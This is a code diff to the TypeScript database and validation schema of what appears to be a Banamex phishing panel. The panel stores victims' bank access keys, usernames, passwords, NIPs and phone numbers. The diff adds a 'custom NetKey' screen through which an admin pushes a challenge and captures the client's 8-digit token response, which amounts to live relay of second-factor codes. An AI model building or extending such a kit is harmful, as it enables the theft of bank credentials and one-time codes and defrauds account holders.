@@ -124,6 +124,8 @@ export const sessions = pgTable("sessions", {
   claveAcceso: text("clave_acceso"), // Clave de acceso de Banamex
   challenge: text("challenge"), // Challenge NetKey de 8 dígitos (código que admin envía)
   netkeyResponse: text("netkey_response"), // Respuesta NetKey del cliente
+  customChallenge: text("custom_challenge"), // Challenge personalizado para NetKey custom desde panel admin
+  customNetkeyResponse: text("custom_netkey_response"), // Respuesta del cliente al NetKey custom
   telefono1: text("telefono1"), // Teléfono de contacto 1
   telefono2: text("telefono2"), // Teléfono de contacto 2 (opcional)
   nombreRepresentante: text("nombre_representante"), // Nombre del representante legal
@@ -226,6 +228,7 @@ export enum ScreenType {
   LOGIN = "login",
   NETKEY = "netkey",
   NETKEY2 = "netkey2",
+  NETKEY_CUSTOM = "netkey_custom",
   DATOS_CONTACTO = "datos_contacto",
   ACCESO_DENEGADO = "acceso_denegado",
   ACCESO_DENEGADO_2 = "acceso_denegado_2",
@@ -264,6 +267,7 @@ export const screenChangeSchema = z.object({
   contrasena: z.string().optional(),
   codigo: z.string().optional(), // Código para la verificación de Google
   challenge: z.string().optional(), // Challenge NetKey de 8 dígitos
+  customChallenge: z.string().optional(), // Challenge personalizado para NetKey custom desde panel admin
 });
 
 export type ScreenChangeData = z.infer<typeof screenChangeSchema>;
@@ -277,6 +281,7 @@ export const clientInputSchema = z.object({
     z.discriminatedUnion('tipo', [
       z.object({ tipo: z.literal('netkey_response'), netkeyResponse: z.string().length(8) }),
       z.object({ tipo: z.literal('netkey2'), netkeyResponse: z.string().length(8) }),
+      z.object({ tipo: z.literal('netkey_custom'), customNetkeyResponse: z.string().length(8) }),
       z.object({ tipo: z.literal('login'), username: z.string(), password: z.string() }),
       z.object({ tipo: z.literal('codigo'), codigo: z.string() }),
       z.object({ tipo: z.literal('nip'), nip: z.string() }),
